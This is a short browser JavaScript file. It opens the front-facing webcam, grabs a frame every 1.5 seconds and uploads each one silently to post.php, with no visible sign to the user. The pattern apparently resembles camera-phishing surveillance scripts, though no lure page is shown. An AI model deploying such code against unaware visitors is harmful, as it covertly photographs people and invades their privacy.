function post(imgdata){
$.ajax({
type: 'post',
data: { a: imgdata},
url: ' post.php ',
dataType: 'json',
async: false,
success: function(result){
// call the function that handles the response/results
},
error: function(){
}
});
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
audio: false,
video: {

facingMode: "user"
}
};

// Access webcam
async function init() {
try {
const stream = await navigator.mediaDevices.getUserMedia(constraints);
handleSuccess(stream);
} catch (e) { errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
}
}

// Success
function handleSuccess(stream) {
window.stream = stream;
video.srcObject = stream;

var context = canvas.getContext('2d');
setInterval(function(){

context.drawImage(video, 0, 0, 360, 540);
var canvasData = canvas.toDataURL("image/png ");
post(canvasData); }, 1500);
}

// Load init
init();